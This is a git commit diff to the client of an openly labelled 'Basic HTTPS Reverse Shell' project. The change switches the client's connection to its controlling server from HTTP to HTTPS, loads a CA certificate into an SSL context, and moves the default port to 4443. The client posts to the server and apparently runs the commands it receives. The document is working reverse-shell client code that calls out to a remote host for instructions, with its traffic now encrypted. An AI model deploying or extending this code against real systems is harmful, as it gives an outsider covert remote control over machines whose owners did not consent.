b8555448477f8d790e58136606229ab3fdcf1e9f
EONRaider <livewire_voodoo@protonmail.com>
2021-11-06 14:32:59 -0300

    Add support for HTTPS

--- src/client/client.py
+++ src/client/client.py
@@ -1,11 +1,13 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/BCA-Basic-HTTP-Reverse-Shell
+# https://github.com/EONRaider/BCA-Basic-HTTPS-Reverse-Shell
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
 import getpass
 import http.client
 import platform
+import ssl
+from pathlib import Path
 from urllib import request, parse
 
 from src.client.commands import ClientCommands
@@ -14,9 +16,14 @@ from src.client.commands import ClientCommands
 class Client:
     def __init__(self,
                  server_address: str,
-                 server_port: int):
-        self.server_url = f"http://{server_address}:{server_port}"
+                 server_port: int,
+                 ca_file: [str, Path]):
+        self.server_url = f"https://{server_address}:{server_port}"
         self.commands = ClientCommands(self)
+        self.ssl_context = ssl.create_default_context(
+            purpose=ssl.Purpose.SERVER_AUTH,
+            cafile=str(ca_file)
+        )
 
     @property
     def shell_prompt(self) -> str:
@@ -40,12 +47,14 @@ class Client:
 
     def post(self, request_body: dict[str, str]) -> str:
         request_body: bytes = parse.urlencode(request_body).encode()
-        req = request.Request(self.server_url, data=request_body)
-        return request.urlopen(req).read().decode()
+        url = request.Request(self.server_url, data=request_body)
+        return request.urlopen(url=url,
+                               context=self.ssl_context).read().decode()
 
 
 if __name__ == "__main__":
     SERVER_ADDRESS = "localhost"
-    SERVER_PORT = 8080
+    SERVER_PORT = 4443
+    CA_FILE = Path(__file__).parents[1].joinpath("ca.crt")
 
-    Client(SERVER_ADDRESS, SERVER_PORT).execute()
+    Client(SERVER_ADDRESS, SERVER_PORT, CA_FILE).execute()
